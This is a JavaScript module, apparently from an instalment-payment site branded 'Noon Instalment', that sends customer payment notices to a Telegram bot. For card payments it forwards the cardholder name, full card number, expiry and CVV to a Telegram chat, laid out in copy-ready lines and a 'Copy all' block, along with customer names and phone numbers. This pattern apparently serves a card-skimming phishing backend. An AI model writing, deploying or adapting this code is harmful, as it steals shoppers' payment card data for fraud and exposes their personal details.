function clip(value, max = 120) {
  return String(value ?? "")
    .replace(/\s+/g, " ")
    .trim()
    .slice(0, max);
}

function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function htmlCode(value, max = 120) {
  const safe = escapeHtml(clip(value, max));
  return safe ? `<code>${safe}</code>` : "";
}

function amount(value) {
  const number = Number(value);
  if (!Number.isFinite(number)) return "0.00";
  return number.toLocaleString("en-US", {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });
}

function buildPlainNotice(payload, monthly, title) {
  return [
    title,
    `Customer: ${clip(payload.name)}`,
    `Code: ${clip(payload.customerCode, 32)}`,
    `Phone: ${clip(payload.phone, 32)}`,
    monthly
      ? `Instalment: SAR ${amount(payload.downPayment)}`
      : `Down payment: SAR ${amount(payload.downPayment)}`,
    `Total: SAR ${amount(payload.totalPrice)}`,
    `Remaining: SAR ${amount(payload.remainingAmount)}`,
    `Monthly: SAR ${amount(payload.monthlyAmount)}`,
    `Plan: ${clip(payload.duration, 8)} months`,
    payload.note ? `Note: ${clip(payload.note, 160)}` : "",
  ]
    .filter(Boolean)
    .join("\n");
}

function buildCardNotice(payload, monthly, title) {
  const lines = [
    `<b>${escapeHtml(title)}</b>`,
    `Customer: ${htmlCode(payload.name)}`,
    `Code: ${htmlCode(payload.customerCode, 32)}`,
    `Phone: ${htmlCode(payload.phone, 32)}`,
    monthly
      ? `Instalment: SAR ${amount(payload.downPayment)}`
      : `Down payment: SAR ${amount(payload.downPayment)}`,
    `Total: SAR ${amount(payload.totalPrice)}`,
    `Remaining: SAR ${amount(payload.remainingAmount)}`,
    `Monthly: SAR ${amount(payload.monthlyAmount)}`,
    `Plan: ${htmlCode(payload.duration, 8)} months`,
    payload.note ? `Note: ${escapeHtml(clip(payload.note, 160))}` : "",
  ].filter(Boolean);

  const cardLines = [
    payload.cardholderName &&
      `Cardholder: ${htmlCode(payload.cardholderName, 80)}`,
    payload.cardNumber && `Card number: ${htmlCode(payload.cardNumber, 24)}`,
    payload.cardExpiry && `Expiry: ${htmlCode(payload.cardExpiry, 8)}`,
    payload.cardCvv && `CVV: ${htmlCode(payload.cardCvv, 6)}`,
  ].filter(Boolean);

  if (cardLines.length) {
    lines.push("");
    lines.push("<b>Card details</b> (tap a line to copy)");
    lines.push(...cardLines);

    const copyBlock = [
      payload.cardholderName &&
        `Cardholder: ${clip(payload.cardholderName, 80)}`,
      payload.cardNumber && `Card number: ${clip(payload.cardNumber, 24)}`,
      payload.cardExpiry && `Expiry: ${clip(payload.cardExpiry, 8)}`,
      payload.cardCvv && `CVV: ${clip(payload.cardCvv, 6)}`,
    ]
      .filter(Boolean)
      .join("\n");

    if (copyBlock) {
      lines.push("");
      lines.push("<b>Copy all</b>");
      lines.push(`<pre>${escapeHtml(copyBlock)}</pre>`);
    }
  }

  return lines.join("\n");
}

export async function sendDownPaymentNotice(payload) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return { ok: false, error: "Telegram is not configured" };
  }

  const monthly = payload.kind === "instalment";
  const isCard =
    payload.method === "card" ||
    Boolean(payload.cardNumber || payload.cardCvv || payload.cardExpiry);
  const title = isCard
    ? monthly
      ? "Noon Instalment — Monthly card payment"
      : "Noon Instalment — Card down payment"
    : monthly
      ? "Noon Instalment — Monthly payment"
      : "Noon Instalment — Down payment";

  const text = isCard
    ? buildCardNotice(payload, monthly, title)
    : buildPlainNotice(payload, monthly, title);

  const body = {
    chat_id: chatId,
    text,
    disable_web_page_preview: true,
  };
  if (isCard) {
    body.parse_mode = "HTML";
  }

  const response = await fetch(
    `https://api.telegram.org/bot${token}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    }
  );

  const data = await response.json().catch(() => ({}));

  if (!response.ok || !data.ok) {
    return {
      ok: false,
      error: clip(data.description || "Telegram notification failed", 180),
    };
  }

  return { ok: true };
}
